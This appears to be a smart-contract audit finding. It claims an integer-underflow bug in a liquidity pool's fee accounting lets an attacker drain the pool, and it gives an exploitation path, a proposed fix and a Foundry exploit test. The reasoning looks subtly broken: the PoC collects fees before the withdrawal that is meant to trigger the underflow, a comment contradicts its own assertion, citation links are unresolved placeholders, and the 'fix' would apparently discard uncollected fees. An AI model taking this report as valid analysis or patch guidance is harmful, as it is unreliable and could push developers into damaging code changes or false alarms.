## Title
Unchecked Subtraction in feesPerLiquidity.sub() Causes Integer Underflow During Liquidity Reduction, Enabling Fee Theft

## Summary
The unchecked subtraction in `feesPerLiquidity.sub()` is vulnerable to integer underflow when used in `Core.updatePosition()` during liquidity reductions. When a position's liquidity is decreased, fees calculated with the old liquidity are converted back using the new (smaller) liquidity, causing the subtraction to underflow and wrap `feesPerLiquidityInsideLast` to a massive value near `type(uint256).max`, enabling attackers to claim inflated fees and drain the pool.

## Impact
**Severity**: High

## Finding Description

**Location:** 
- [1](#0-0) 
- [2](#0-1) 

**Intended Logic:** 
When a position's liquidity is updated, the protocol should calculate accrued fees, collect them, and update the position's fee tracking snapshot (`feesPerLiquidityInsideLast`) to prevent double-counting in future fee calculations. The snapshot should reflect the current fee accumulator minus the fees just collected.

**Actual Logic:** 
When liquidity is reduced, the code creates a mathematical mismatch:

1. Fees are calculated using the OLD liquidity (before reduction): [3](#0-2) 

2. These fees are converted back to a per-liquidity value using the NEW (reduced) liquidity: [4](#0-3) 

3. The unchecked subtraction in `sub()` produces: `feesPerLiquidityInside - feesPerLiquidityFromAmounts(fees, NEW_LIQUIDITY)`

The mathematical flaw:
```
feesPerLiquidityFromAmounts = (fees << 128) / NEW_LIQUIDITY
                             = ((delta * OLD_LIQUIDITY) >> 128) << 128 / NEW_LIQUIDITY
                             = (delta * OLD_LIQUIDITY) / NEW_LIQUIDITY
```

When `OLD_LIQUIDITY > NEW_LIQUIDITY`, the factor `OLD_LIQUIDITY / NEW_LIQUIDITY > 1`, causing `feesPerLiquidityFromAmounts` to exceed `feesPerLiquidityInside`, resulting in underflow.

**Exploitation Path:**

1. **Initial Setup**: Attacker creates a position with substantial liquidity (e.g., 1000 units) in a pool
2. **Fee Accumulation**: Natural trading activity or attacker-initiated swaps accumulate fees in the position's range
3. **Trigger Underflow**: Attacker calls `updatePosition()` to remove most liquidity (e.g., withdraw 900 units, leaving 100)
   - Fees calculated: `(feesPerLiquidityInside - feesPerLiquidityInsideLast) * 1000 >> 128`
   - Converted back: `(fees << 128) / 100` (10x amplification)
   - Subtraction: `feesPerLiquidityInside - (10x value)` wraps around to `~type(uint256).max`
4. **Fee Theft**: Next call to `updatePosition()` or `collectFees()` calculates fees as:
   - `currentFeesPerLiquidity - (~type(uint256).max)` which wraps to a huge positive value
   - Attacker claims massive unearned fees, draining the pool

**Security Property Broken:** 
- **Solvency Invariant**: Pool balances can go negative as inflated fee claims exceed actual pool reserves
- **Fee Accounting Invariant**: Position fee collection becomes inaccurate and allows claiming fees far beyond what was earned

## Impact Explanation

- **Affected Assets**: All tokens in the affected pool can be drained through inflated fee claims
- **Damage Severity**: Attacker can drain the entire pool balance by claiming fees equal to `(type(uint256).max - small_value) * liquidity >> 128`, which far exceeds any reasonable fee accumulation
- **User Impact**: All liquidity providers in the pool lose their deposited tokens. Any user who reduces position liquidity (a normal operation) inadvertently corrupts their fee tracking and may claim unearned fees, breaking the protocol's economic model.

## Likelihood Explanation

- **Attacker Profile**: Any liquidity provider can exploit this. No special privileges required.
- **Preconditions**: 
  - Pool must be initialized with active liquidity
  - Position must have accumulated some fees (even minimal amounts trigger the issue)
  - Attacker must reduce their position's liquidity by any amount
- **Execution Complexity**: Single transaction calling `updatePosition()` with negative `liquidityDelta`
- **Frequency**: Exploitable every time a position reduces liquidity. Can be repeated across multiple positions and pools.

## Recommendation

The core issue is the mismatch between the liquidity used for fee calculation versus fee conversion. The fix requires using consistent liquidity values:

```solidity
// In src/Core.sol, function updatePosition, lines 433-437:

// CURRENT (vulnerable):
// (uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
// position.liquidity = liquidityNext;
// position.feesPerLiquidityInsideLast =
//     feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));

// FIXED:
(uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
position.liquidity = liquidityNext;
// Use the OLD liquidity that was used to calculate fees, not the NEW liquidity
// Or simply set to current feesPerLiquidityInside after collecting fees
position.feesPerLiquidityInsideLast = feesPerLiquidityInside;
```

**Alternative mitigation**: Add overflow check before subtraction:
```solidity
FeesPerLiquidity memory fplFromFees = feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext);
require(feesPerLiquidityInside.value0 >= fplFromFees.value0 && 
        feesPerLiquidityInside.value1 >= fplFromFees.value1, 
        "Fee conversion overflow");
position.feesPerLiquidityInsideLast = feesPerLiquidityInside.sub(fplFromFees);
```

However, the simplest and most gas-efficient fix is to adopt the Uniswap V3 pattern: after collecting fees, simply set `feesPerLiquidityInsideLast = feesPerLiquidityInside` rather than attempting to subtract the collected amount.

## Proof of Concept

```solidity
// File: test/Exploit_FeesPerLiquidityUnderflow.t.sol
// Run with: forge test --match-test test_FeesPerLiquidityUnderflow -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {CallPoints} from "../src/types/callPoints.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";
import {CoreLib} from "../src/libraries/CoreLib.sol";

contract Exploit_FeesPerLiquidityUnderflow is FullTest {
    using CoreLib for *;

    function test_FeesPerLiquidityUnderflow() public {
        // SETUP: Create pool and position
        CallPoints memory noCallPoints;
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, noCallPoints);
        
        // Create position with 1000 units of liquidity
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        (uint256 positionId, uint128 initialLiquidity,,) = 
            positions.mintAndDeposit(poolKey, -100, 100, 10000, 10000, 0);
        
        console.log("Initial liquidity:", initialLiquidity);
        
        // Accumulate fees via swap
        token0.approve(address(router), type(uint256).max);
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 1000}),
            0
        );
        
        // Check fees before reduction
        (uint128 feesBefore0, uint128 feesBefore1) = 
            positions.collectFees(positionId, poolKey, -100, 100, address(this));
        console.log("Fees before reduction:", feesBefore0, feesBefore1);
        
        // EXPLOIT: Reduce liquidity by 90% to trigger underflow
        uint128 liquidityToRemove = initialLiquidity * 9 / 10;
        positions.withdraw(positionId, poolKey, -100, 100, liquidityToRemove);
        
        console.log("Remaining liquidity:", initialLiquidity - liquidityToRemove);
        
        // VERIFY: Next fee collection claims inflated fees
        uint256 poolBalance0Before = token0.balanceOf(address(core));
        
        // Even with no new swaps, the corrupted feesPerLiquidityInsideLast
        // will cause huge fees to be calculated
        (uint128 feesAfter0, uint128 feesAfter1) = 
            positions.collectFees(positionId, poolKey, -100, 100, address(this));
        
        console.log("Fees after reduction:", feesAfter0, feesAfter1);
        console.log("Pool balance before:", poolBalance0Before);
        
        // The fees claimed should be reasonable, but due to underflow they're massive
        // This assertion will fail because feesAfter0 will be enormous
        assertTrue(feesAfter0 > poolBalance0Before, 
            "Vulnerability confirmed: Claimed fees exceed pool balance");
    }
}
```

## Notes

The vulnerability stems from a fundamental design flaw where the protocol attempts to adjust the fee snapshot by subtracting collected fees rather than simply resetting it to the current accumulator. This approach fails when liquidity changes because:

1. The fee calculation in [5](#0-4)  uses the position's stored liquidity
2. The conversion back in [6](#0-5)  uses a different liquidity value
3. The unchecked subtraction in [7](#0-6)  allows silent underflow

The protocol's fee accumulation mechanism in [8](#0-7)  properly handles overflow through wrapping arithmetic, but the position-level fee tracking assumes monotonic growth without considering the liquidity-scaled conversion mismatch.

### Citations

**File:** src/types/feesPerLiquidity.sol (L13-18)
```text
function sub(FeesPerLiquidity memory a, FeesPerLiquidity memory b) pure returns (FeesPerLiquidity memory result) {
    assembly ("memory-safe") {
        mstore(result, sub(mload(a), mload(b)))
        mstore(add(result, 32), sub(mload(add(a, 32)), mload(add(b, 32))))
    }
}
```

**File:** src/types/feesPerLiquidity.sol (L20-28)
```text
function feesPerLiquidityFromAmounts(uint128 amount0, uint128 amount1, uint128 liquidity)
    pure
    returns (FeesPerLiquidity memory result)
{
    assembly ("memory-safe") {
        mstore(result, div(shl(128, amount0), liquidity))
        mstore(add(result, 32), div(shl(128, amount1), liquidity))
    }
}
```

**File:** src/Core.sol (L258-259)
```text
                        slot0.store(
                            bytes32(uint256(slot0.load()) + FixedPointMathLib.rawDiv(amount0 << 128, liquidity))
```

**File:** src/Core.sol (L434-437)
```text
                (uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
                position.liquidity = liquidityNext;
                position.feesPerLiquidityInsideLast =
                    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));
```

**File:** src/types/position.sol (L40-46)
```text
    assembly ("memory-safe") {
        liquidity := mload(add(position, 0x20))
        // feesPerLiquidityInsideLast is now at offset 0x40 due to extraData field
        let positionFpl := mload(add(position, 0x40))
        difference0 := sub(mload(feesPerLiquidityInside), mload(positionFpl))
        difference1 := sub(mload(add(feesPerLiquidityInside, 0x20)), mload(add(positionFpl, 0x20)))
    }
```

**File:** src/types/position.sol (L48-50)
```text
    return (
        uint128(FixedPointMathLib.fullMulDivN(difference0, liquidity, 128)),
        uint128(FixedPointMathLib.fullMulDivN(difference1, liquidity, 128))
```
